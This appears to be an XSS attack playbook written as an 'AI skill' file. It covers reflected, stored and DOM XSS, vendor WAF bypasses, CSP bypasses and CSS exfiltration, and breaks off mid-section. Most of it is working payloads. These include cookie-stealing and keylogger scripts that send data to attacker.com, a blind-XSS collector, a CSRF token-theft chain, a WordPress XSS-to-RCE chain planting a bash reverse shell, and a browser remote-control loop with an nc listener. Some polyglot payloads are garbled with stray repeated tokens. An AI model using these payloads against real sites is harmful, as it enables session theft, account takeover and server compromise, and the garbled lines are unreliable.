---
name: injection-xss
description: >-
  XSS complete attack chain. Covers reflected/stored/DOM XSS, WAF bypass by vendor (Cloudflare/Akamai/Imperva), CSP bypass (strict-dynamic/base-uri/nonce leak/JSONP/cdn.jsdelivr.net), advanced tricks (mXSS/DOM Clobbering/Service Worker persistence/CSS exfil), dangling markup injection (token theft without JS), and CSV/Formula injection (DDE / Google Sheets IMPORTXML / LibreOffice WEBSERVICE — four dangerous prefix chars =/+/-/@). Load when user input reaches HTML/JS/CSS context or spreadsheet-cell export.
---

# XSS — Complete Attack Chain

## Internal Navigation

| Section | Content |
|---|---|
| Part 1 | Core XSS Techniques & WAF Bypass |
| Part 2 | Extended Scenarios & Real-World Cases |
| Part 3 | Advanced XSS Tricks |
| Part 4 | CSP Bypass Advanced |
| Part 5 | Dangling Markup Injection |
| Part 6 | CSV / Formula Injection (CSI) |

---

# Part 1: Core XSS Techniques & WAF Bypass


# SKILL: Cross-Site Scripting (XSS) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: This skill covers non-obvious XSS techniques, context-specific payload selection, WAF bypass, CSP bypass, and post-exploitation. Assume the reader already knows `<script>alert(1)</script>` — this file only covers what base models typically miss. For real-world CVE cases, HttpOnly bypass strategies, XS-Leaks side channels, and session fixation attacks, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Django debug page XSS (CVE-2017-12794) — duplicate key error → unescaped exception → XSS
- UTF-7 XSS for legacy IE environments (`+ADw-script+AD4-`)
- HttpOnly bypass methodology — proxy-the-browser, session riding, CSRF-via-XSS
- XS-Leaks side channel attacks — timing oracle, cache probing, `performance.now()` measurement
- Session fixation via XSS — pre-set session ID before victim login
- DOM clobbering techniques for CSP-restricted environments

### Advanced Tricks

Also load [ADVANCED_XSS_TRICKS.md](./ADVANCED_XSS_TRICKS.md) when you need:
- mXSS / DOMPurify bypass — namespace confusion, `<noscript>` parsing differential, form/table restructuring
- DOM Clobbering — property override via `id`/`name`, HTMLCollection, deep property chains
- Modern framework XSS — React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`, Next.js SSR
- Trusted Types bypass — default policy abuse, non-TT sinks, policy passthrough
- Service Worker XSS persistence — malicious SW registration, fetch interception, post-patch survival
- PDF/SVG/MathML XSS vectors, polyglot payloads, browser-specific tricks
- XS-Leaks & side channels — timing oracle, frame counting, cache probing, error event oracle

Before broad payload spraying, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when you need the full upload path: validation, storage, preview, and sharing behavior

### Quick context picks

| Context | First Pick | Backup |
|---|---|---|
| HTML body | `<svg onload=alert(1)>` | `<img src=1 onerror=alert(1)>` |
| Quoted attribute | `" autofocus onfocus=alert(1)//` | `" onmouseover=alert(1)//` |
| JavaScript string | `'-alert(1)-'` | `'</script><svg onload=alert(1)>` |
| URL / href sink | `javascript:alert(1)` | `data:text/html,<svg onload=alert(1)>` |
| Tag body like `title` | `</title><svg onload=alert(1)>` | `</textarea><svg onload=alert(1)>` |
| SVG / XML sink | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` | XHTML namespace payload |

```html
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
" autofocus onfocus=alert(1)//
'</script><svg onload=alert(1)>
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
```


## 1. INJECTION CONTEXT MATRIX

Identify context **before** picking a payload. Wrong context = wasted attempts.

| Context | Indicator | Opener | Payload |
|---|---|---|---|
| HTML outside tag | `<b>INPUT</b>` | `<svg onload=` | `<svg onload=alert(1)>` |
| HTML attribute value | `value="INPUT"` | `"` close attr | `"onmouseover=alert(1)//` |
| Inline attr, no tag close | Quoted, `>` stripped | Event injection | `"autofocus onfocus=alert(1)//` |
| Block tag (title/script/textarea) | `<title>INPUT</title>` | Close tag first | `</title><svg onload=alert(1)>` |
| href / src / data / action | link or form | Protocol | `javascript:alert(1)` |
| JS string (single quote) | `var x='INPUT'` | Break string | `'-alert(1)-'` or `'-alert(1)//` |
| JS string with escape | Backslash escaping | Double escape | `\'-alert(1)//` |
| JS logical block | Inside if/function | Close + inject | `'}alert(1);{'` |
| JS anywhere on page | `<script>...INPUT` | Break script | `</script><svg onload=alert(1)>` |
| XML page (`text/xml`) | XML content-type | XML namespace | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |

---

## 2. MULTI-REFLECTION ATTACKS

When input reflects in **multiple places** on the same page — single payload triggers from all points:

```html
<!-- Double reflection -->
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*

<!-- Triple reflection -->
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='

<!-- Two separate inputs (p= and q=) -->
p=<svg/1='&q='onload=alert(1)>
```

---

## 3. ADVANCED INJECTION VECTORS

### DOM Insert Injection (when reflection is in DOM not source)
Input inserted via `.innerHTML`, `document.write`, jQuery `.html()`:
```html
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
```
For URL-controlled resource insertion:
```html
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```

### PHP_SELF Path Injection
When URL itself is reflected in form `action`:
```
https://target.com/page.php/"><svg onload=alert(1)>?param=val
```
Inject between `.php` and `?`, using leading `/`.

### File Upload XSS

**Filename injection** (when filename is reflected):
```
"><svg onload=alert(1)>.gif
```

**SVG upload** (stored XSS via image upload accepting SVG):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**Metadata injection** (when EXIF is reflected):
```bash
exiftool -Artist='"><svg onload=alert(1)>' photo.jpeg
```

### postMessage XSS (no origin check)
When page has `window.addEventListener('message', ...)` without origin validation:
```html
<iframe src="TARGET_URL" onload="frames[0].postMessage('INJECTION','*')">
```

### postMessage Origin Bypass
When origin IS checked but uses `.includes()` or prefix match:
```
http://facebook.com.ATTACKER.com/crosspwn.php?target=//victim.com/page&msg=<script>alert(1)</script>
```
Attacker controls `facebook.com.ATTACKER.com` subdomain.

### XML-Based XSS
Response has `text/xml` or `application/xml`:
```html
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//attacker.com/1.js"/>
```

### Script Injection Without Closing Tag
When there IS a `</script>` tag later in the page:
```html
<script src=data:,alert(1)>
<script src=//attacker.com/1.js>
```

---

## 4. CSP BYPASS TECHNIQUES

### JSONP Endpoint Bypass (allow-listed domain has JSONP)
```html
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);">
</script>
```

### AngularJS CDN Bypass (allow-listed `ajax.googleapis.com`)
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</x>
```

### Angular Expressions (server encodes HTML but AngularJS evaluates)
When `{{1+1}}` evaluates to `2` on page — classic CSTI indicator:
```javascript
// Angular 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}

// Angular 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

### base-uri Injection (CSP without base-uri restriction)
```html
<base href="https://attacker.com/">
```
Relative `<script src=...>` loads from attacker's server.

### DOM-based via Dangling Markup
When CSP blocks script but allows `img`:
```html
<img src='https://attacker.com/log?
```
Leaks subsequent page content to attacker.

---

## 5. FILTER AND WAF BYPASS

### Parameter Name Attack (WAF checks value not name)
When parameter names are reflected (e.g., in JSON output):
```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```
Payload is the **parameter name**, not value.

### Encoding Chains
```
%253C  → double-encoded <
%26lt; → HTML entity double-encoding
<%00h2 → null byte injection
%0d%0a → CRLF inside tag
```
Test sequence: reflect → encoding behavior → identify filter logic → mutate.

### Tag Mutation (blacklist bypass)
```html
<ScRipt>  ← case variation
</script/x>  ← trailing garbage
<script  ← incomplete (relies on later >)
<%00iframe  ← null byte
<svg/onload=  ← slash instead of space
```

### Fragmented Injection (strip-tags bypass)
Filter strips `<x>...</x>`:
```
"o<x>nmouseover=alert<x>(1)//
"autof<x>ocus o<x>nfocus=alert<x>(1)//
```

### Vectors Without Event Handlers
```html
<form action=javascript:alert(1)><input type=submit>
<form><button formaction=javascript:alert(1)>click
<isindex action=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<math><brute href=javascript:alert(1)>click
```

---

## 6. SECOND-ORDER XSS

**Definition**: Input is stored (often normalized/HTML-encoded), then later **retrieved** and inserted into DOM without re-encoding.

**Classic trigger payload** (bypasses immediate HTML encoding):
```
&lt;svg/onload&equals;alert(1)&gt;
```
Check: profile fields, display names, forum posts — anywhere data is stored, then re-rendered in a different context (e.g., admin panel vs user-facing).

**Stored → Admin context XSS**: most impactful — sign up with crafted username, wait for admin to view user list.

---

## 7. BLIND XSS METHODOLOGY

Every parameter that is **not immediately reflected** should be tested for blind XSS:
- Contact forms, feedback fields
- User-agent / referer  
- Registration fields
- Error log injections

**Blind XSS callback payload** (remote JS file approach):
```html
"><script src=//attacker.com/bxss.js></script>
```

**Minimal collector** (hosted at `bxss.js`):
```javascript
var d = document;
var msg = 'URL: '+d.URL+'\nCOOKIE: '+d.cookie+'\nDOM:\n'+d.documentElement.innerHTML;
fetch('https://attacker.com/collect?'+encodeURIComponent(msg));
```

Use **XSS Hunter** or similar blind XSS platform for automated collection.

---

## 8. XSS EXPLOITATION CHAIN

### Cookie Steal
```javascript
fetch('//attacker.com/?c='+document.cookie)
// HttpOnly protected cookies → not stealable via JS, need CSRF or session fixation instead
```

### Keylogger
```javascript
document.onkeypress = function(e) {
    fetch('//attacker.com/k?k='+encodeURIComponent(e.key));
}
```

### CSRF via XSS (bypasses CSRF protection, reads CSRF token from DOM)
```javascript
var r = new XMLHttpRequest();
r.open('GET', '/account/settings', false);
r.send();
var token = /csrf_token['":\s]+([^'"<\s]+)/.exec(r.responseText)[1];
var f = new XMLHttpRequest();
f.open('POST', '/account/email/change', true);
f.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
f.send('email=attacker@evil.com&csrf='+token);
```

### WordPress XSS → RCE (admin session + Hello Dolly plugin):
```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

### Browser Remote Control (JS command shell)
```javascript
// Injected into victim:
setInterval(function(){
    with(document)body.appendChild(createElement('script')).src='//ATTACKER:5855'
},100)
```
```bash
# Attacker listener:
while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
```

---

## 9. DECISION TREE

```
Test XSS entry point
├── Input reflected in response?
│   ├── YES → Identify context (HTML / JS / attr / URL)
│   │         → Select context-appropriate payload
│   │         → If blocked → check filter behavior
│   │         │   → Try encoding, case mutation, fragmentation
│   │         │   → Check if parameter NAME is reflected (WAF gap)
│   │         └── Success → escalate (cookie steal / CSRF / RCE)
│   └── NO  → Is it stored? → Inject blind XSS payload
│             Is it in DOM? → Check JS source for unsafe sinks
│                             (innerHTML, eval, document.write, location.href)
└── CSP present?
    ├── Check for JSONP endpoints on allow-listed domains
    ├── Check for AngularJS on CDN allow-list
    ├── Check for base-uri missing → <base> injection
    └── Check for unsafe-eval or unsafe-inline exceptions
```

---

## 10. XSS TESTING PROCESS (ZSEANO METHOD)

1. **Step 1** — Test non-malicious tags: `<h2>`, `<img>`, `<table>` — are they reflected raw?
2. **Step 2** — Test incomplete tags: `<iframe src=//attacker.com/c=` (no closing `>`) 
3. **Step 3** — Encoding probes: `<%00h2`, `%0d`, `%0a`, `%09`, `%253C`  
4. **Step 4** — If filtering `<script>` and `onerror` but NOT `<script ` (without close): `<script src=//attacker.com?c=`
5. **Step 5** — Blacklist check: does `<svg>` work? Does `<ScRiPt>` work?
6. Note: **the same filter likely exists elsewhere** — if they filter `<script>` in search, do they filter it in file upload filename? In profile bio?

**Key insight**: Filter presence = vulnerability exists, developer tried to patch. Chase that thread across the entire application.


---

# Part 2: Extended Scenarios & Real-World Cases


## 1. CVE Case: Django Debug Page XSS (CVE-2017-12794)

Django's debug error page displays unescaped exception messages. When a `UNIQUE` constraint violation occurs, the duplicate value is shown raw:

**Attack flow**:
1. Register username: `<script>alert(1)</script>`
2. Attempt to register again with the same username
3. Django raises `IntegrityError` with the duplicate key value
4. Debug page renders: `duplicate key value violates unique constraint... (<script>alert(1)</script>)`
5. Script executes in the debug page context

**Conditions**: `DEBUG=True` in production (common in misconfigured deployments).


## 2. UTF-7 XSS (Legacy)

When the page does not specify charset and Internet Explorer auto-detects encoding:

```text
+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

IE interprets `+ADw-` as `<` in UTF-7 encoding. The server must not set `Content-Type: text/html; charset=utf-8` for this to work.

**Modern relevance**: Rare, but still found in legacy intranet applications using IE compatibility mode.

---

## 3. HttpOnly Bypass Strategies

`HttpOnly` prevents `document.cookie` from reading the session cookie, but XSS can still:

| Technique | How It Works |
|---|---|
| **Proxy the browser** | XSS sends authenticated requests on behalf of victim (XMLHttpRequest/fetch with credentials) — no need to steal the cookie |
| **CSRF via XSS** | Read CSRF token from DOM → perform state-changing actions |
| **Keylogger** | Capture credentials as victim types |
| **Session riding** | Browse the application through injected JS, extract data from responses |
| **TRACE method** | Historical: `TRACE` reflects cookies in response body (blocked in modern servers) |

**Key insight**: HttpOnly does NOT prevent XSS exploitation — it only prevents cookie theft specifically. The attacker can do everything the victim can do through proxied requests.

---

## 4. XS-Leaks (Cross-Site Leak) Scenarios

XS-Leaks infer information about cross-origin pages without reading their content, using side channels:

### Timing-Based Search Oracle

```javascript
async function probe(query) {
    const start = performance.now();
    const img = new Image();
    img.src = `https://target.com/search?q=${query}&_=${Date.now()}`;
    await new Promise(r => { img.onload = img.onerror = r; });
    return performance.now() - start;
}

// If search for "admin_secret" takes 200ms vs 50ms for "nonexistent"
// → "admin_secret" has results → information leaked
```

### Amplification Techniques

- Use search queries that return large result sets → measurable timing difference
- Combine with slow backend operations (regex search, DB full-scan)
- Frame counting: `window.length` reveals iframe count on cross-origin page

### Defense

```
Cache-Control: no-store
```

Prevent timing oracle via cached vs uncached response times. Also: do not use predictable resource names (e.g., `/users/alice/avatar.png`).

---

## 5. Session Fixation via XSS

When the application does not regenerate session IDs after login:

**Attack flow**:
1. Attacker obtains a valid (unauthenticated) session ID
2. Attacker forces victim's browser to use this session ID:
   ```
   https://target.com/setcookie.php?PHPSESSID=attacker_known_value
   ```
3. Victim logs in — the pre-set session ID is now authenticated
4. Attacker uses the same session ID → authenticated as victim

**XSS variant**: inject `document.cookie = "PHPSESSID=FIXED_VALUE"` via stored XSS before victim logs in.

**Fix**: `session_regenerate_id(true)` after authentication.

---

## 6. DOM Clobbering

When CSP blocks inline scripts but allows named HTML elements:

```html
<form id="x"><output id="y">payload</output></form>
<!-- Now document.x.y.value === "payload" -->
<!-- If app code does: element.innerHTML = document.x.y.value → XSS -->
```

Useful when the application trusts DOM properties derived from element IDs/names.

---

## 7. XSS POLYGLOT PAYLOADS

```javascript
// 0xsobky universal:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// s0md3v:
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>

// brutelogic:
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26LT;LT;*/prompt()//

// Polyglot for multiple contexts:
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouse
over=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

---

## 8. WAF BYPASS BY VENDOR

### Cloudflare

```html
<svg onload=prompt``>
<!-- Use onnull, onrandom (unknown event handlers pass through) -->
<img src=x onnull=alert(1)>
<!-- Entity encoding: -->
<a href="j&#97;v&#97;scr&#105;pt:alert(1)">click</a>
<!-- Tab/newline in javascript: scheme -->
<a href="java
script:alert(1)">click</a>
```

### Akamai

```html
</script><base href="javascript:/a]/-alert(1)//">
<dETAILS open oNtoggle=alert(1)>
<!-- Mutation: -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### Incapsula (Imperva)

```html
<!-- jQuery-based bypass: -->
<script>$.globalEval("al"+"ert(1)")</script>
<!-- Data URI in object: -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### WordFence (WordPress)

```html
<!-- Entity encoding javascript: -->
<a href="javas&#99;ript:alert(1)">click</a>
<!-- Unicode escapes: -->
<img src=x onerror="&#x61;lert(1)">
```

### Fortiweb

```html
<!-- Unicode tag bypass: -->
\u003e\u003cscript\u003ealert(1)\u003c/script\u003e
```

---

## 9. CSP BYPASS TECHNIQUES

### Common CSP Bypasses

```
# If 'unsafe-inline' is allowed → standard XSS works

# If script-src includes CDN with JSONP:
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

# If script-src includes 'self' + file upload:
Upload JS file → <script src="/uploads/evil.js"></script>

# If base-uri not restricted:
<base href="https://attacker.com/">
<script src="/js/app.js"></script>  <!-- Fetches from attacker.com -->

# If script-src allows data: scheme:
<script src="data:text/javascript,alert(1)"></script>

# If strict-dynamic is used without nonce:
<script>document.createElement('script').src='//evil.com/x.js'</script>
```

### DOM Clobbering for CSP Bypass

```html
<!-- Clobber variables used by CSP-nonce scripts -->
<a id="config" href="javascript:alert(1)">
<form id="config"><input name="url" value="javascript:alert(1)"></form>

<!-- Multi-level clobbering: x.y.value -->
<a id=x><a id=x name=y href="javascript:alert(1)">
<!-- document.getElementById('x') returns HTMLCollection -->
<!-- x.y.href = "javascript:alert(1)" -->

<!-- DomPurify bypass with cid: protocol -->
<a id=x href="cid:alert(1)">
<!-- Some sanitizers allow cid: scheme -->

<!-- 3-level deep clobbering via iframe -->
<iframe name=x srcdoc="<a id=y><a id=y name=z href='javascript:alert(1)'>">
<!-- Access: x.y.z.href -->
```

---

## 10. CSS INJECTION DATA EXFILTRATION

When you can inject CSS but NOT JavaScript (common with CSP `style-src 'unsafe-inline'`):

### Attribute Selector Brute-Force

```css
/* Extract CSRF token or input values character by character: */
input[name="csrf"][value^="a"] { background: url(https://attacker.com/?token=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.com/?token=b); }
/* ... for each character ... */
input[name="csrf"][value^="ab"] { background: url(https://attacker.com/?token=ab); }
/* Server receives callback revealing the token prefix that matched */
```

### @font-face + unicode-range Side Channel

```css
/* Detect specific characters in text nodes: */
@font-face { font-family: probe; src: url(https://attacker.com/?char=A); unicode-range: U+0041; }
@font-face { font-family: probe; src: url(https://attacker.com/?char=B); unicode-range: U+0042; }
/* Apply to target element: */
.secret-text { font-family: probe; }
/* Browser only loads font for characters that actually appear in the text */
```

### Ligature Width Side Channel

```css
/* Create custom font where specific character sequences have different widths */
/* Use CSS to detect element width changes → infer text content */
/* More complex but works for text nodes that attribute selectors can't reach */
```

### Sequential Import Chaining

```css
/* @import chain for multi-round extraction: */
@import url(https://attacker.com/round1.css);
/* Server returns CSS with selectors for next character based on round 1 results */
/* Each round narrows down the token value */
```


---

# Part 3: Advanced XSS Tricks


## 2. DOM Clobbering

Override JavaScript variables/properties by injecting HTML elements with specific `id` or `name` attributes.

### Basic Clobbering
```html
<!-- Clobber window.x -->
<img id=x>
<!-- Now window.x === the <img> element -->

<!-- Clobber nested: window.x.y -->
<form id=x><img id=y></form>
<!-- window.x.y === the <img> element -->

<!-- Clobber window.x.y via <a> href (toString = href) -->
<a id=x href="javascript:alert(1)">
<!-- String(window.x) === "javascript:alert(1)" -->
```

### HTMLCollection Clobbering (array-like)
```html
<a id=x>1</a><a id=x>2</a>
<!-- window.x is HTMLCollection [a, a] -->
<!-- window.x[0], window.x[1] accessible -->
```

### Deep Property Clobbering (3+ levels)
```html
<form id=x name=y><input id=z></form>
<!-- document.x.y.z exists -->
```

### Exploit Patterns
If code does `if (window.config) { url = window.config.url; }` and `config` is not defined:
```html
<a id=config href="https://attacker.com/evil.js">
```
Code now loads attacker-controlled URL.

### Defense Check
Code using `typeof x !== 'undefined'` or `x instanceof Object` can sometimes be bypassed because DOM elements are objects.


## 3. Modern Framework XSS

### React
- `dangerouslySetInnerHTML={{__html: userInput}}` — direct XSS if userInput is unsanitized
- `href={userInput}` on `<a>` — `javascript:` protocol not blocked by React
- SSR hydration mismatch — server renders different HTML than client expects, dangling markup possible
- `eval()` in `useEffect` with user data

### Vue.js
- `v-html="userInput"` — equivalent to innerHTML, no sanitization
- Server-side template injection via `{{ }}` in SSR mode
- `v-bind:href` / `:href` accepts `javascript:` URIs
- Component `is` attribute with user input → dynamic component injection

### Angular
- `bypassSecurityTrustHtml()` / `bypassSecurityTrustUrl()` — explicit trust marking
- Angular Universal SSR template injection
- `[innerHTML]` binding with bypassed sanitizer
- Older Angular.js (1.x) sandbox escapes still relevant for legacy apps:
```
{{constructor.constructor('alert(1)')()}}
{{'a]'.constructor.prototype.charAt=[].join;$eval('x=1}alert(1)//')}}
```

### Next.js / Nuxt
- `getServerSideProps` returning unsanitized data rendered with `dangerouslySetInnerHTML`
- API routes reflecting input without encoding
- `_document.js` custom head injection

---

## 4. Trusted Types Bypass

Trusted Types enforce that DOM XSS sinks only accept typed objects, not raw strings. Bypass requires finding a policy or sink gap.

### Finding Bypass Vectors
1. **Default policy exists** — look for `trustedTypes.createPolicy('default', ...)` with weak sanitization
2. **Policy with passthrough** — `createHTML: (s) => s` effectively disables protection
3. **Sinks not covered by TT** — `document.cookie`, `window.name`, `location.href` (navigation sinks)
4. **`eval` type policies** — if `createScript` is permissive
5. **DOM clobbering to override policy name** — clobber `trustedTypes` if checked loosely

### Non-TT-Protected Sinks
```javascript
window.name = payload;       // persists across navigations
document.cookie = payload;   // cookie injection
location.href = payload;     // navigation-based XSS
location.hash = payload;     // fragment injection
window.open(payload);        // popup with javascript:
```

### Policy Abuse
```javascript
// If a policy does basic tag stripping but misses event handlers:
const p = trustedTypes.createPolicy('sanitize', {
  createHTML: s => s.replace(/<script>/gi, '')
});
// Bypass: <img onerror=alert(1) src=x>
```

---

## 5. Service Worker XSS Persistence

### Registering Malicious Service Worker
If XSS allows script execution and the scope allows SW registration:
```javascript
navigator.serviceWorker.register('/sw.js', {scope: '/'})
```

### Self-Contained SW via importScripts
```javascript
// If you control a JS file or can inject via upload:
self.addEventListener('fetch', e => {
  if (e.request.url.includes('/target-page')) {
    e.respondWith(new Response('<script>alert(document.cookie)</script>', 
      {headers: {'Content-Type': 'text/html'}}));
  }
});
```

### Persistence Value
- SW persists after XSS payload is cleaned/patched
- Intercepts all fetch requests within scope
- Can inject into every page load until SW is unregistered
- Survives page refresh, tab close/reopen

### Requirements
- HTTPS (or localhost)
- SW script must be served from same origin with valid JS content-type
- Scope restricted to SW script's directory and below

---

## 6. PDF/SVG/XML XSS Vectors

### PDF XSS (Adobe reader in browser)
```
/page.pdf#a]%0d/teleType(alert(1))%0d[/a
```

### SVG Polyglot
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>
```

### SVG `<use>` External Reference
```html
<svg><use href="https://attacker.com/evil.svg#xss"></use></svg>
```

### MathML XSS
```html
<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">click</maction></math>
```

---

## 7. XS-Leaks & Side Channels (Advanced)

### Timing-Based Detection
```javascript
// Detect if user is logged in to target site
let t0 = performance.now();
fetch('https://target.com/api/me', {mode: 'no-cors'});
let t1 = performance.now();
// Authenticated responses are larger/slower → timing oracle
```

### Frame Counting
```javascript
let w = window.open('https://target.com/search?q=SECRET');
setTimeout(() => {
  // w.length = number of iframes in response
  // Different result count → different frame count → oracle
  console.log(w.length);
}, 2000);
```

### Error Event Oracle
```javascript
// Image loads successfully only for authenticated users
let img = new Image();
img.onload = () => { /* user is logged in */ };
img.onerror = () => { /* user is not logged in */ };
img.src = 'https://target.com/avatar.png';
```

### Cache Probing
```javascript
// Check if resource is cached (= user visited target page)
let t0 = performance.now();
fetch('https://target.com/static/logo.png', {cache: 'force-cache', mode: 'no-cors'});
let t1 = performance.now();
// Cached: fast. Not cached: slow.
```

---

## 8. Polyglot XSS Payloads

Single payloads that work across multiple contexts:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0teleType%0teleType1teleType22teleType33teleType44teleType55teleType66teleType77[7teleType]teleType8teleType9teleType0teleType/teleType*'teleType"*/
</teleType>%0teleType<teleType>alert(1)</teleType>

javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=alert()//>

-->'"/></sCript><dETAILS/+/teleType/+=teleType/OnToggle=alert()>

'"-->]]>*/</script></style></title></textarea><!--<p class="--><img src=x onerror=alert()>">
```

---

## 9. Browser-Specific Tricks

### Chrome-Specific
- `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` — animation event
- Blink-specific parsing in `<template>` content

### Firefox-Specific  
- `<math><mrow xlink:type="simple" xlink:href="javascript:alert(1)">click</mrow></math>`
- `-moz-binding` CSS (deprecated but sometimes present in legacy)

### Safari-Specific
- `<input onfocus=alert(1) autofocus type=search incremental=true>`
- WebKit-specific `<marquee>` event handlers


---

# Part 4: CSP Bypass Advanced


# SKILL: CSP Bypass — Advanced Techniques

> **AI LOAD INSTRUCTION**: Covers per-directive bypass techniques, nonce/hash abuse, trusted CDN exploitation, data exfiltration despite CSP, and framework-specific bypasses. Base models often suggest `unsafe-inline` bypass without checking if the CSP actually uses it, or miss the critical `base-uri` and `object-src` gaps.

## 0. RELATED ROUTING

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS vectors to deliver after CSP bypass
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) when CSP blocks scripts but HTML injection exists — exfiltrate without JS
- [crlf-injection](../crlf-injection/SKILL.md) when CRLF can inject CSP header or steal nonce via response splitting
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) when both WAF and CSP must be bypassed
- [clickjacking](../clickjacking/SKILL.md) when CSP lacks `frame-ancestors` — clickjacking still possible


## 1. CSP DIRECTIVE REFERENCE MATRIX

| Directive | Controls | Default Fallback |
|---|---|---|
| `default-src` | Fallback for all `-src` directives not explicitly set | None (browser default: allow all) |
| `script-src` | JavaScript execution | `default-src` |
| `style-src` | CSS loading | `default-src` |
| `img-src` | Image loading | `default-src` |
| `connect-src` | XHR, fetch, WebSocket, EventSource | `default-src` |
| `frame-src` | iframe/frame sources | `default-src` |
| `font-src` | Font loading | `default-src` |
| `object-src` | `<object>`, `<embed>`, `<applet>` | `default-src` |
| `media-src` | `<audio>`, `<video>` | `default-src` |
| `base-uri` | `<base>` element | **No fallback** — unrestricted if absent |
| `form-action` | Form submission targets | **No fallback** — unrestricted if absent |
| `frame-ancestors` | Who can embed this page (replaces X-Frame-Options) | **No fallback** — unrestricted if absent |
| `report-uri` / `report-to` | Where violation reports are sent | N/A |
| `navigate-to` | Navigation targets (limited browser support) | **No fallback** |

**Critical insight**: `base-uri`, `form-action`, and `frame-ancestors` do NOT fall back to `default-src`. Their absence is always a potential bypass vector.

---

## 2. BYPASS TECHNIQUES BY DIRECTIVE

### 2.1 `script-src 'self'`

The app only allows scripts from its own origin. Bypass vectors:

| Vector | Technique |
|---|---|
| JSONP endpoints | `<script src="/api/jsonp?callback=alert(1)//"></script>` — JSONP reflects callback as JS |
| Uploaded JS files | Upload `.js` file (e.g., avatar upload accepts any extension) → `<script src="/uploads/evil.js"></script>` |
| DOM XSS sinks | Find DOM sinks (innerHTML, eval, document.write) in existing same-origin JS — inject via URL fragment/param |
| Angular/Vue template injection | If framework is loaded from `'self'`, inject template expressions: `{{constructor.constructor('alert(1)')()}}` |
| Service Worker | Register SW from same origin → intercept and modify responses |
| Path confusion | `<script src="/user-content/;/legit.js">` — server returns user content due to path parsing, but URL matches `'self'` |

### 2.2 `script-src` with CDN Whitelist

```
script-src 'self' *.googleapis.com *.gstatic.com cdn.jsdelivr.net
```

| Whitelisted CDN | Bypass |
|---|---|
| `cdnjs.cloudflare.com` | Host arbitrary JS via CDNJS (find lib with callback/eval): `angular.js` → template injection |
| `cdn.jsdelivr.net` | jsdelivr serves any npm package or GitHub file: `cdn.jsdelivr.net/npm/attacker-package@1.0.0/evil.js` |
| `*.googleapis.com` | Google JSONP endpoints, Google Maps callback parameter |
| `unpkg.com` | Same as jsdelivr — serves arbitrary npm packages |
| `*.cloudfront.net` | CloudFront distributions are shared — any CF customer's JS is allowed |

**Trick**: Search for JSONP endpoints on whitelisted domains: `site:googleapis.com inurl:callback`

### 2.3 `script-src 'unsafe-eval'`

`eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)` all permitted.

```javascript
// Template injection → RCE-equivalent in browser
